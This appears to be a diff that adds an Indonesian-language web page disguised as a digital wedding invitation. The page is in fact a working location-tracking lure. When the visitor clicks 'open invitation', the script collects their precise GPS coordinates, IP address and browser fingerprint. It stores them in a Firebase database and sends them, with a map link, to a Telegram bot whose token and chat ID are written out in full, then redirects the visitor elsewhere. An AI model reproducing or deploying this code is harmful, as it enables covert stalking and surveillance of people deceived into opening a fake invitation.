@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Undangan Digital</title>
+<style>
+body{font-family:system-ui;background:#0e0e10;color:#eee;text-align:center;padding:60px 20px;margin:0}
+h1{font-size:24px}
+.btn{background:#e11;color:#fff;padding:16px 32px;border:none;border-radius:10px;font-size:18px;margin-top:28px;cursor:pointer}
+.muted{color:#888;font-size:13px;margin-top:18px}
+</style>
+</head>
+<body>
+  <h1>📩 Undangan Pernikahan</h1>
+  <p>Untuk membuka undangan, izinkan akses lokasi Anda.</p>
+  <button class="btn" onclick="ask()">Buka Undangan</button>
+  <div class="muted" id="s"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, push, serverTimestamp }
+  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAix0w6jXzMWWlTy2qVd94FwCkHFqZFp_k",
+  authDomain: "vinzx-tracker.firebaseapp.com",
+  databaseURL: "https://vinzx-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "vinzx-tracker",
+  storageBucket: "vinzx-tracker.firebasestorage.app",
+  messagingSenderId: "954145933533",
+  appId: "1:954145933533:web:ef331709e50f2e9f22f334"
+};
+
+const TG_TOKEN = "8624450970:AAFFyNkuKSnMu1BEFfo8cnkQXGCK03DKUHA";
+const TG_CHAT_ID = "8568200659";
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+function fp(){
+  return {
+    ua: navigator.userAgent,
+    lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: screen.width + "x" + screen.height,
+    plat: navigator.platform
+  };
+}
+
+async function getIP(){
+  try{
+    const r = await fetch("https://api.ipify.org?format=json");
+    const j = await r.json();
+    return j.ip;
+  }catch(e){ return null; }
+}
+
+async function sendTG(text){
+  try{
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: "HTML" })
+    });
+  }catch(e){}
+}
+
+async function send(payload){
+  try{
+    await push(ref(db, "hits"), { ...payload, ts: serverTimestamp() });
+  }catch(e){}
+
+  const ip = await getIP();
+  const lines = [
+    `🎯 <b>HIT BARU</b>`,
+    `IP   : <code>${ip || "-"}</code>`,
+    `Lat  : <code>${payload.lat || "-"}</code>`,
+    `Lon  : <code>${payload.lon || "-"}</code>`,
+    `Acc  : ${payload.acc ? Math.round(payload.acc) + "m" : "-"}`,
+    `Maps : https://www.google.com/maps?q=${payload.lat},${payload.lon}`,
+    `UA   : ${(payload.fp && payload.fp.ua || "").slice(0, 100)}`
+  ];
+  sendTG(lines.join("\n"));
+}
+
+function ask(){
+  document.getElementById("s").innerText = "Memuat undangan...";
+  if(!navigator.geolocation){
+    send({ fp: fp(), geo: "unsupported" });
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      send({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy,
+        fp: fp()
+      });
+      document.getElementById("s").innerText = "Membuka...";
+      setTimeout(() => { location.href = "https://example.com"; }, 1500);
+    },
+    err => {
+      send({ fp: fp(), geo_err: err.message });
+      document.getElementById("s").innerText = "Akses lokasi ditolak.";
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+window.ask = ask;
+</script>
+</body>
+</html>
